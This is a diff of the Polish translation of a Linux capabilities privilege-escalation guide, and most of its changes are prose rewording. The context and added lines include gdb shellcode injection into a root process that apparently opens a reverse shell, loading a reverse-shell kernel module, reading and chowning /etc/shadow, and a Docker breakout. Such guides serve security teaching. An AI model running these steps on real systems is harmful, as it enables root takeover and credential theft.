@@ -34,25 +34,25 @@ Linux capabilities dzielą **uprawnienia roota na mniejsze, odrębne jednostki**
 1. **Inherited (CapInh)**:
 - **Cel**: Określa uprawnienia przekazywane z procesu nadrzędnego.
 - **Funkcjonalność**: Gdy tworzony jest nowy proces, dziedziczy on uprawnienia z procesu nadrzędnego w tym zestawie. Przydatne do utrzymania pewnych uprawnień podczas uruchamiania procesów.
-- **Ograniczenia**: Proces nie może uzyskać uprawnień, których jego proces nadrzędny nie posiadał.
+- **Ograniczenia**: Proces nie może uzyskać uprawnień, których nie posiadał jego proces nadrzędny.
 
 2. **Effective (CapEff)**:
 - **Cel**: Reprezentuje rzeczywiste uprawnienia, które proces wykorzystuje w danym momencie.
 - **Funkcjonalność**: To zestaw uprawnień sprawdzany przez jądro w celu przyznania zgody na różne operacje. Dla plików, ten zestaw może być flagą wskazującą, czy dozwolone uprawnienia pliku mają być uznawane za skuteczne.
-- **Znaczenie**: Zestaw efektywny jest kluczowy dla natychmiastowych kontroli uprawnień, działając jako aktywny zestaw uprawnień, które proces może wykorzystać.
+- **Znaczenie**: Zestaw skuteczny jest kluczowy dla natychmiastowych kontroli uprawnień, działając jako aktywny zestaw uprawnień, które proces może wykorzystać.
 
 3. **Permitted (CapPrm)**:
-- **Cel**: Określa maksymalny zestaw uprawnień, które proces może posiadać.
-- **Funkcjonalność**: Proces może podnieść uprawnienie z zestawu dozwolonego do swojego zestawu efektywnego, dając mu możliwość użycia tego uprawnienia. Może również zrezygnować z uprawnień z zestawu dozwolonego.
+- **Cel**: Definiuje maksymalny zestaw uprawnień, które proces może posiadać.
+- **Funkcjonalność**: Proces może podnieść uprawnienie z zestawu dozwolonego do swojego zestawu skutecznego, dając mu możliwość użycia tego uprawnienia. Może również zrezygnować z uprawnień z zestawu dozwolonego.
 - **Granica**: Działa jako górna granica dla uprawnień, które proces może mieć, zapewniając, że proces nie przekroczy swojego zdefiniowanego zakresu uprawnień.
 
 4. **Bounding (CapBnd)**:
 - **Cel**: Ustala sufit dla uprawnień, które proces może kiedykolwiek nabyć w trakcie swojego cyklu życia.
-- **Funkcjonalność**: Nawet jeśli proces ma pewne uprawnienie w swoim zestawie dziedzicznym lub dozwolonym, nie może nabyć tego uprawnienia, chyba że jest ono również w zestawie ograniczającym.
+- **Funkcjonalność**: Nawet jeśli proces ma określone uprawnienie w swoim zestawie dziedzicznym lub dozwolonym, nie może nabyć tego uprawnienia, chyba że jest ono również w zestawie ograniczającym.
 - **Przykład użycia**: Ten zestaw jest szczególnie przydatny do ograniczania potencjału eskalacji uprawnień procesu, dodając dodatkową warstwę bezpieczeństwa.
 
 5. **Ambient (CapAmb)**:
-- **Cel**: Pozwala na utrzymanie pewnych uprawnień podczas wywołania systemowego `execve`, które zazwyczaj skutkowałoby pełnym resetem uprawnień procesu.
+- **Cel**: Pozwala na utrzymanie niektórych uprawnień podczas wywołania systemowego `execve`, które zazwyczaj skutkowałoby pełnym resetem uprawnień procesu.
 - **Funkcjonalność**: Zapewnia, że programy nie-SUID, które nie mają związanych uprawnień plików, mogą zachować pewne uprawnienia.
 - **Ograniczenia**: Uprawnienia w tym zestawie podlegają ograniczeniom zestawów dziedzicznych i dozwolonych, zapewniając, że nie przekraczają one dozwolonych uprawnień procesu.
 ```python
@@ -138,11 +138,11 @@ $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
 Jak widać, podane możliwości odpowiadają wynikom 2 sposobów uzyskiwania możliwości binarnego.\
-Narzędzie _getpcaps_ używa wywołania systemowego **capget()**, aby zapytać o dostępne możliwości dla konkretnego wątku. To wywołanie systemowe potrzebuje jedynie podać PID, aby uzyskać więcej informacji.
+Narzędzie _getpcaps_ używa wywołania systemowego **capget()** do zapytania o dostępne możliwości dla konkretnego wątku. To wywołanie systemowe potrzebuje jedynie podać PID, aby uzyskać więcej informacji.
 
-### Możliwości binariów
+### Możliwości Binarne
 
-Binarne pliki mogą mieć możliwości, które mogą być używane podczas wykonywania. Na przykład, bardzo często można znaleźć binarny plik `ping` z możliwością `cap_net_raw`:
+Binarne mogą mieć możliwości, które mogą być używane podczas wykonywania. Na przykład, bardzo często można znaleźć binarny `ping` z możliwością `cap_net_raw`:
 ```bash
 getcap /usr/bin/ping
 /usr/bin/ping = cap_net_raw+ep
@@ -171,8 +171,8 @@ setcap -r </path/to/binary>
 ```
 ## User Capabilities
 
-Wyraźnie **możliwe jest przypisanie uprawnień również do użytkowników**. To prawdopodobnie oznacza, że każdy proces wykonywany przez użytkownika będzie mógł korzystać z uprawnień użytkownika.\
-Na podstawie [tego](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [tego](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) i [tego](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) należy skonfigurować kilka plików, aby nadać użytkownikowi określone uprawnienia, ale plik przypisujący uprawnienia do każdego użytkownika to `/etc/security/capability.conf`.\
+Wyraźnie **możliwe jest przypisanie możliwości również do użytkowników**. To prawdopodobnie oznacza, że każdy proces wykonywany przez użytkownika będzie mógł korzystać z możliwości użytkownika.\
+Na podstawie [tego](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [tego](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) i [tego](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) należy skonfigurować kilka plików, aby nadać użytkownikowi określone możliwości, ale plik przypisujący możliwości do każdego użytkownika to `/etc/security/capability.conf`.\
 Przykład pliku:
 ```bash
 # Simple
@@ -187,7 +187,7 @@ cap_net_admin,cap_net_raw    jrnetadmin
 # Combining names and numerics
 cap_sys_admin,22,25          jrsysadmin
 ```
-## Możliwości środowiska
+## Możliwości Środowiska
 
 Kompilując następujący program, możliwe jest **uruchomienie powłoki bash w środowisku, które zapewnia możliwości**.
 
@@ -287,23 +287,23 @@ gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 ./ambient /bin/bash
 ```
-Wewnątrz **bash uruchomionego przez skompilowany binarny ambient** można zaobserwować **nowe możliwości** (zwykły użytkownik nie będzie miał żadnej możliwości w sekcji "aktualnej").
+Wewnątrz **bash uruchomionego przez skompilowany binarny ambient** można zaobserwować **nowe możliwości** (zwykły użytkownik nie będzie miał żadnej możliwości w sekcji "bieżącej").
 ```bash
 capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
 {% hint style="danger" %}
-Możesz **dodawać tylko te uprawnienia, które są obecne** zarówno w zestawie dozwolonym, jak i dziedziczonym.
+Możesz **dodawać tylko te możliwości, które są obecne** zarówno w zestawie dozwolonym, jak i dziedziczonym.
 {% endhint %}
 
-### Binaries świadome/nieświadome uprawnień
+### Binaries świadome możliwości/Binaries nieświadome możliwości
 
-**Binaries świadome uprawnień nie będą używać nowych uprawnień** nadanych przez środowisko, jednak **binaries nieświadome uprawnień będą je** używać, ponieważ ich nie odrzucą. To sprawia, że binaries nieświadome uprawnień są podatne w specjalnym środowisku, które przyznaje uprawnienia binarnym.
+**Binaries świadome możliwości nie będą używać nowych możliwości** nadanych przez środowisko, jednak **binaries nieświadome możliwości będą je** używać, ponieważ ich nie odrzucą. To sprawia, że binaries nieświadome możliwości są podatne w specjalnym środowisku, które przyznaje możliwości binarnym.
 
-## Uprawnienia usług
+## Możliwości usługi
 
-Domyślnie **usługa działająca jako root będzie miała przypisane wszystkie uprawnienia**, a w niektórych przypadkach może to być niebezpieczne.\
-Dlatego plik **konfiguracji usługi** pozwala **określić** **uprawnienia**, które chcesz, aby miała, **oraz** **użytkownika**, który powinien uruchomić usługę, aby uniknąć uruchamiania usługi z niepotrzebnymi uprawnieniami:
+Domyślnie **usługa działająca jako root będzie miała przypisane wszystkie możliwości**, a w niektórych przypadkach może to być niebezpieczne.\
+Dlatego plik **konfiguracji usługi** pozwala **określić** **możliwości**, które chcesz, aby miała, **oraz** **użytkownika**, który powinien uruchomić usługę, aby uniknąć uruchamiania usługi z niepotrzebnymi uprawnieniami:
 ```bash
 [Service]
 User=bob
@@ -351,9 +351,9 @@ Aby zidentyfikować programy w systemie lub folderze z zdolnościami:
 ```bash
 getcap -r / 2>/dev/null
 ```
-### Przykład wykorzystania
+### Przykład eksploatacji
 
-W następującym przykładzie binarka `/usr/bin/python2.6` została uznana za podatną na privesc:
+W następującym przykładzie binarny plik `/usr/bin/python2.6` okazuje się być podatny na privesc:
 ```bash
 setcap cap_setuid+ep /usr/bin/python2.7
 /usr/bin/python2.7 = cap_setuid+ep
@@ -373,7 +373,7 @@ getcap /usr/sbin/tcpdump
 
 1. nie jest własnością roota
 2. nie ma ustawionych bitów `SUID`/`SGID`
-3. ma ustawione puste możliwości (np.: `getcap myelf` zwraca `myelf =ep`)
+3. ma pusty zestaw możliwości (np.: `getcap myelf` zwraca `myelf =ep`)
 
 to **ta binarka będzie działać jako root**.
 
@@ -572,7 +572,7 @@ buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
 buf += b"\x0f\x05"
 
 # Divisible by 8
-payload = b"\x90" * (8 - len(buf) % 8 ) + buf
+payload = b"\x90" * (-len(buf) % 8) + buf
 
 # Change endianess and print gdb lines to load the shellcode in RIP directly
 for i in range(0, len(buf), 8):
@@ -585,21 +585,23 @@ print(f"set {{long}}($rip+{i}) = {chunks}")
 ```
 Debuguj proces root za pomocą gdb i skopiuj-wklej wcześniej wygenerowane linie gdb:
 ```bash
+# Let's write the commands to a file
+echo 'set {long}($rip+0) = 0x296a909090909090
+set {long}($rip+8) = 0x5e016a5f026a9958
+set {long}($rip+16) = 0x0002b9489748050f
+set {long}($rip+24) = 0x48510b0e0a0a2923
+set {long}($rip+32) = 0x582a6a5a106ae689
+set {long}($rip+40) = 0xceff485e036a050f
+set {long}($rip+48) = 0x6af675050f58216a
+set {long}($rip+56) = 0x69622fbb4899583b
+set {long}($rip+64) = 0x8948530068732f6e
+set {long}($rip+72) = 0x050fe689485752e7
+c' > commands.gdb
 # In this case there was a sleep run by root
 ## NOTE that the process you abuse will die after the shellcode
 /usr/bin/gdb -p $(pgrep sleep)
 [...]
-(gdb) set {long}($rip+0) = 0x296a909090909090
-(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
-(gdb) set {long}($rip+16) = 0x0002b9489748050f
-(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
-(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
-(gdb) set {long}($rip+40) = 0xceff485e036a050f
-(gdb) set {long}($rip+48) = 0x6af675050f58216a
-(gdb) set {long}($rip+56) = 0x69622fbb4899583b
-(gdb) set {long}($rip+64) = 0x8948530068732f6e
-(gdb) set {long}($rip+72) = 0x050fe689485752e7
-(gdb) c
+(gdb) source commands.gdb
 Continuing.
 process 207009 is executing new program: /usr/bin/dash
 [...]
@@ -619,7 +621,7 @@ Nie będziesz w stanie zobaczyć wyniku wykonanego polecenia, ale zostanie ono w
 Jeśli otrzymasz błąd "No symbol "system" in current context.", sprawdź poprzedni przykład ładowania shellcode w programie za pomocą gdb.
 {% endhint %}
 
-**Przykład z środowiskiem (wyjście z Dockera) - Wstrzykiwanie shellcode**
+**Przykład z użyciem środowiska (Docker breakout) - Wstrzykiwanie shellcode**
 
 Możesz sprawdzić włączone możliwości wewnątrz kontenera docker za pomocą:
 ```bash
@@ -644,8 +646,8 @@ List **procesy** działające w **hoście** `ps -eaf`
 
 ## CAP\_SYS\_MODULE
 
-**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** umożliwia procesowi **ładowanie i usuwanie modułów jądra (`init_module(2)`, `finit_module(2)` i `delete_module(2)` system calls)**, oferując bezpośredni dostęp do podstawowych operacji jądra. Ta zdolność stwarza poważne zagrożenia dla bezpieczeństwa, ponieważ umożliwia eskalację uprawnień i całkowite kompromitowanie systemu poprzez pozwolenie na modyfikacje jądra, omijając wszystkie mechanizmy zabezpieczeń Linuxa, w tym moduły zabezpieczeń Linuxa i izolację kontenerów.  
-**To oznacza, że możesz** **wstawiać/usuwać moduły jądra z/do jądra maszyny hosta.**
+**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** upoważnia proces do **ładowania i usuwania modułów jądra (`init_module(2)`, `finit_module(2)` i `delete_module(2)` system calls)**, oferując bezpośredni dostęp do podstawowych operacji jądra. Ta zdolność stwarza poważne zagrożenia dla bezpieczeństwa, ponieważ umożliwia eskalację uprawnień i całkowite naruszenie systemu, pozwalając na modyfikacje jądra, a tym samym omijając wszystkie mechanizmy zabezpieczeń Linuxa, w tym moduły zabezpieczeń Linuxa i izolację kontenerów.  
+**To oznacza, że możesz** **wstawiać/usuwać moduły jądra w/ze jądra maszyny hosta.**
 
 **Przykład z binarnym**
 
@@ -664,7 +666,7 @@ Następnie **skompiluj moduł jądra, który możesz znaleźć w 2 przykładach 
 ```bash
 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
-Na koniec, wykonaj potrzebny kod Pythona, aby załadować ten moduł jądra:
+Na koniec wykonaj potrzebny kod Pythona, aby załadować ten moduł jądra:
 ```python
 import kmod
 km = kmod.Kmod()
@@ -762,12 +764,12 @@ Inny przykład tej techniki można znaleźć w [https://www.cyberark.com/resourc
 
 ## CAP\_DAC\_READ\_SEARCH
 
-[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia procesowi **ominięcie uprawnień do odczytu plików oraz do odczytu i wykonywania katalogów**. Jego główne zastosowanie dotyczy wyszukiwania lub odczytu plików. Jednak pozwala również procesowi na użycie funkcji `open_by_handle_at(2)`, która może uzyskać dostęp do dowolnego pliku, w tym tych poza przestrzenią montowania procesu. Uchwycony użyty w `open_by_handle_at(2)` powinien być nieprzezroczystym identyfikatorem uzyskanym za pomocą `name_to_handle_at(2)`, ale może zawierać wrażliwe informacje, takie jak numery i-node, które są podatne na manipulacje. Potencjał do wykorzystania tej zdolności, szczególnie w kontekście kontenerów Docker, został zaprezentowany przez Sebastiana Krahmera w exploicie shocker, jak analizowano [tutaj](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
+[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia procesowi **ominięcie uprawnień do odczytu plików oraz do odczytu i wykonywania katalogów**. Jego główne zastosowanie dotyczy wyszukiwania lub odczytu plików. Jednak pozwala również procesowi na użycie funkcji `open_by_handle_at(2)`, która może uzyskać dostęp do dowolnego pliku, w tym tych poza przestrzenią montowania procesu. Uchwycony użyty w `open_by_handle_at(2)` powinien być nieprzezroczystym identyfikatorem uzyskanym za pomocą `name_to_handle_at(2)`, ale może zawierać wrażliwe informacje, takie jak numery i-node, które są podatne na manipulacje. Potencjał do wykorzystania tej możliwości, szczególnie w kontekście kontenerów Docker, został zaprezentowany przez Sebastiana Krahmera za pomocą exploita shocker, jak analizowano [tutaj](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
 **Oznacza to, że możesz** **ominięcie kontroli uprawnień do odczytu plików oraz kontroli uprawnień do odczytu/wykonywania katalogów.**
 
 **Przykład z binarnym**
 
-Binarne będzie mogło odczytać dowolny plik. Więc, jeśli plik taki jak tar ma tę zdolność, będzie mógł odczytać plik shadow:
+Binarne będzie mogło odczytać dowolny plik. Więc, jeśli plik taki jak tar ma tę możliwość, będzie mógł odczytać plik shadow:
 ```bash
 cd /etc
 tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
@@ -802,11 +804,11 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-W poprzednim wyjściu można zobaczyć, że zdolność **DAC\_READ\_SEARCH** jest włączona. W rezultacie kontener może **debugować procesy**.
+W poprzednim wyniku można zobaczyć, że zdolność **DAC\_READ\_SEARCH** jest włączona. W rezultacie kontener może **debugować procesy**.
 
 Możesz dowiedzieć się, jak działa poniższe wykorzystanie w [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ale w skrócie **CAP\_DAC\_READ\_SEARCH** nie tylko pozwala nam przechodzić przez system plików bez sprawdzania uprawnień, ale także wyraźnie usuwa wszelkie kontrole do _**open\_by\_handle\_at(2)**_ i **może pozwolić naszemu procesowi na dostęp do wrażliwych plików otwartych przez inne procesy**.
 
-Oryginalny exploit, który wykorzystuje te uprawnienia do odczytu plików z hosta, można znaleźć tutaj: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), poniżej znajduje się **zmodyfikowana wersja, która pozwala wskazać plik, który chcesz odczytać jako pierwszy argument i zrzucić go do pliku.**
+Oryginalny exploit, który nadużywa tych uprawnień do odczytu plików z hosta, można znaleźć tutaj: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), poniżej znajduje się **zmodyfikowana wersja, która pozwala wskazać plik, który chcesz odczytać jako pierwszy argument i zrzucić go do pliku.**
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -968,15 +970,15 @@ Eksploit musi znaleźć wskaźnik do czegoś zamontowanego na hoście. Oryginaln
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Z **misją promowania wiedzy technicznej**, ten kongres jest gorącym punktem spotkań dla profesjonalistów technologii i cyberbezpieczeństwa w każdej dziedzinie.
+​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Z **misją promowania wiedzy technicznej**, ten kongres jest gorącym punktem spotkań dla profesjonalistów z technologii i cyberbezpieczeństwa w każdej dziedzinie.
 
 {% embed url="https://www.rootedcon.com/" %}
 
 ## CAP\_DAC\_OVERRIDE
 
-**To oznacza, że możesz obejść kontrole uprawnień do zapisu w dowolnym pliku, więc możesz zapisać dowolny plik.**
+**Oznacza to, że możesz obejść kontrole uprawnień do zapisu w dowolnym pliku, więc możesz zapisać dowolny plik.**
 
-Jest wiele plików, które możesz **nadpisać, aby zwiększyć uprawnienia,** [**możesz znaleźć pomysły tutaj**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
+Jest wiele plików, które możesz **nadpisać, aby podnieść uprawnienia,** [**możesz znaleźć pomysły tutaj**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
 **Przykład z binarnym**
 
@@ -1160,7 +1162,7 @@ Aby wydostać się z kontenera docker, możesz **pobrać** pliki `/etc/shadow` i
 
 **Przykład z binarnym**
 
-Załóżmy, że binarny **`python`** ma tę zdolność, możesz **zmienić** **właściciela** pliku **shadow**, **zmienić hasło roota** i eskalować uprawnienia:
+Załóżmy, że **`python`** ma tę zdolność, możesz **zmienić** **właściciela** pliku **shadow**, **zmienić hasło roota** i eskalować uprawnienia:
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
@@ -1205,7 +1207,7 @@ os.system("/bin/bash")
 
 Jest wiele plików, które możesz **nadpisać, aby zwiększyć uprawnienia,** [**możesz zaczerpnąć pomysły stąd**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
-**Przykład z binarką**
+**Przykład z binarnym**
 
 W tym przypadku powinieneś szukać interesujących plików, które grupa może odczytać, ponieważ możesz udawać dowolną grupę:
 ```bash
@@ -1283,7 +1285,7 @@ CapAmb: 0000000000000000
 capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
-Ta zdolność pozwala na **przyznanie dowolnej innej zdolności binarnym**, więc możemy pomyśleć o **ucieczce** z kontenera **wykorzystując dowolne inne wyłomy zdolności** wspomniane na tej stronie.\
+Ta zdolność pozwala na **przyznanie dowolnej innej zdolności binarnym**, więc możemy pomyśleć o **ucieczce** z kontenera **wykorzystując dowolne inne wyłamania zdolności** wspomniane na tej stronie.\
 Jednakże, jeśli spróbujesz przyznać na przykład zdolności CAP\_SYS\_ADMIN i CAP\_SYS\_PTRACE binarnemu gdb, odkryjesz, że możesz je przyznać, ale **binarne nie będzie mogło się wykonać po tym**:
 ```bash
 getcap /usr/bin/gdb
@@ -1384,7 +1386,7 @@ Jeśli binarka **`tcpdump`** ma to uprawnienie, będziesz mógł jej użyć do p
 getcap -r / 2>/dev/null
 /usr/sbin/tcpdump = cap_net_raw+ep
 ```
-Zauważ, że jeśli **środowisko** przyznaje tę zdolność, możesz również użyć **`tcpdump`**, aby podsłuchiwać ruch.
+Zauważ, że jeśli **środowisko** przyznaje tę zdolność, możesz również użyć **`tcpdump`**, aby przechwycić ruch.
 
 **Przykład z binarnym 2**
 
@@ -1436,9 +1438,9 @@ count=count+1
 
 [**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) uprawnienie daje posiadaczowi moc **zmiany konfiguracji sieci**, w tym ustawień zapory, tabel routingu, uprawnień gniazd oraz ustawień interfejsów sieciowych w ramach wystawionych przestrzeni nazw sieci. Umożliwia również włączenie **trybu promiskuitywnego** na interfejsach sieciowych, co pozwala na sniffing pakietów w różnych przestrzeniach nazw.
 
-**Przykład z binarką**
+**Przykład z binarnym**
 
-Załóżmy, że **binarka python** ma te uprawnienia.
+Załóżmy, że **binarne pliki python** mają te uprawnienia.
 ```python
 #Dump iptables filter table rules
 import iptc
@@ -1452,7 +1454,7 @@ iptc.easy.flush_table('filter')
 ```
 ## CAP\_LINUX\_IMMUTABLE
 
-**Oznacza to, że możliwe jest modyfikowanie atrybutów inode.** Nie możesz bezpośrednio eskalować uprawnień za pomocą tej zdolności.
+**To oznacza, że możliwe jest modyfikowanie atrybutów inode.** Nie możesz bezpośrednio eskalować uprawnień za pomocą tej zdolności.
 
 **Przykład z binarnym**
 
@@ -1489,7 +1491,7 @@ sudo chattr -i file.txt
 
 ## CAP\_SYS\_CHROOT
 
-[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia wykonanie wywołania systemowego `chroot(2)`, co potencjalnie pozwala na ucieczkę z środowisk `chroot(2)` poprzez znane luki:
+[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia wykonanie wywołania systemowego `chroot(2)`, co potencjalnie może pozwolić na ucieczkę z środowisk `chroot(2)` poprzez znane luki:
 
 * [Jak wydostać się z różnych rozwiązań chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
 * [chw00t: narzędzie do ucieczki z chroot](https://github.com/earthquake/chw00t/)
@@ -1551,17 +1553,17 @@ To podejście pozwala standardowemu użytkownikowi na dostęp i potencjalne odcz
 
 ### CAP\_SETPCAP
 
-**CAP_SETPCAP** umożliwia procesowi **zmianę zestawów uprawnień** innego procesu, co pozwala na dodawanie lub usuwanie uprawnień z zestawów efektywnych, dziedzicznych i dozwolonych. Jednak proces może modyfikować tylko te uprawnienia, które posiada w swoim własnym dozwolonym zestawie, co zapewnia, że nie może podnieść uprawnień innego procesu ponad swoje własne. Ostatnie aktualizacje jądra zaostrzyły te zasady, ograniczając `CAP_SETPCAP` do jedynie zmniejszania uprawnień w swoim własnym lub dozwolonym zestawie jego potomków, mając na celu złagodzenie ryzyk bezpieczeństwa. Użycie wymaga posiadania `CAP_SETPCAP` w zestawie efektywnym oraz docelowych uprawnień w zestawie dozwolonym, wykorzystując `capset()` do modyfikacji. To podsumowuje podstawową funkcję i ograniczenia `CAP_SETPCAP`, podkreślając jego rolę w zarządzaniu uprawnieniami i poprawie bezpieczeństwa.
+**CAP_SETPCAP** umożliwia procesowi **zmianę zestawów uprawnień** innego procesu, co pozwala na dodawanie lub usuwanie uprawnień z zestawów efektywnych, dziedzicznych i dozwolonych. Jednak proces może modyfikować tylko te uprawnienia, które posiada w swoim własnym dozwolonym zestawie, co zapewnia, że nie może podnieść uprawnień innego procesu ponad swoje własne. Ostatnie aktualizacje jądra zaostrzyły te zasady, ograniczając `CAP_SETPCAP` do jedynie zmniejszania uprawnień w swoim własnym lub dozwolonym zestawie swoich potomków, mając na celu złagodzenie ryzyk bezpieczeństwa. Użycie wymaga posiadania `CAP_SETPCAP` w zestawie efektywnym oraz docelowych uprawnień w zestawie dozwolonym, wykorzystując `capset()` do modyfikacji. To podsumowuje podstawową funkcję i ograniczenia `CAP_SETPCAP`, podkreślając jego rolę w zarządzaniu uprawnieniami i poprawie bezpieczeństwa.
 
 **`CAP_SETPCAP`** to uprawnienie w systemie Linux, które pozwala procesowi na **modyfikację zestawów uprawnień innego procesu**. Daje możliwość dodawania lub usuwania uprawnień z efektywnych, dziedzicznych i dozwolonych zestawów uprawnień innych procesów. Jednak istnieją pewne ograniczenia dotyczące tego, jak to uprawnienie może być używane.
 
 Proces z `CAP_SETPCAP` **może jedynie przyznawać lub usuwać uprawnienia, które znajdują się w jego własnym dozwolonym zestawie uprawnień**. Innymi słowy, proces nie może przyznać uprawnienia innemu procesowi, jeśli sam go nie posiada. To ograniczenie zapobiega podnoszeniu uprawnień innego procesu ponad własny poziom uprawnień.
 
-Co więcej, w ostatnich wersjach jądra, uprawnienie `CAP_SETPCAP` zostało **dodatkowo ograniczone**. Nie pozwala już procesowi na dowolną modyfikację zestawów uprawnień innych procesów. Zamiast tego **pozwala jedynie procesowi na obniżenie uprawnień w swoim własnym dozwolonym zestawie uprawnień lub w dozwolonym zestawie uprawnień jego potomków**. Ta zmiana została wprowadzona w celu zmniejszenia potencjalnych ryzyk bezpieczeństwa związanych z tym uprawnieniem.
+Ponadto, w ostatnich wersjach jądra, uprawnienie `CAP_SETPCAP` zostało **dodatkowo ograniczone**. Już nie pozwala procesowi na dowolną modyfikację zestawów uprawnień innych procesów. Zamiast tego **pozwala jedynie procesowi na obniżenie uprawnień w swoim własnym dozwolonym zestawie uprawnień lub w dozwolonym zestawie uprawnień swoich potomków**. Ta zmiana została wprowadzona w celu zmniejszenia potencjalnych ryzyk bezpieczeństwa związanych z tym uprawnieniem.
 
 Aby skutecznie używać `CAP_SETPCAP`, musisz mieć to uprawnienie w swoim efektywnym zestawie uprawnień oraz docelowe uprawnienia w swoim dozwolonym zestawie uprawnień. Możesz następnie użyć wywołania systemowego `capset()`, aby modyfikować zestawy uprawnień innych procesów.
 
-Podsumowując, `CAP_SETPCAP` pozwala procesowi na modyfikację zestawów uprawnień innych procesów, ale nie może przyznać uprawnień, których sam nie posiada. Dodatkowo, z powodu obaw o bezpieczeństwo, jego funkcjonalność została ograniczona w ostatnich wersjach jądra, aby pozwalać jedynie na redukcję uprawnień w swoim własnym dozwolonym zestawie uprawnień lub w dozwolonych zestawach uprawnień jego potomków.
+Podsumowując, `CAP_SETPCAP` pozwala procesowi na modyfikację zestawów uprawnień innych procesów, ale nie może przyznawać uprawnień, których sam nie posiada. Dodatkowo, z powodu obaw o bezpieczeństwo, jego funkcjonalność została ograniczona w ostatnich wersjach jądra do jedynie obniżania uprawnień w swoim własnym dozwolonym zestawie uprawnień lub w dozwolonych zestawach uprawnień swoich potomków.
 
 ## References
 
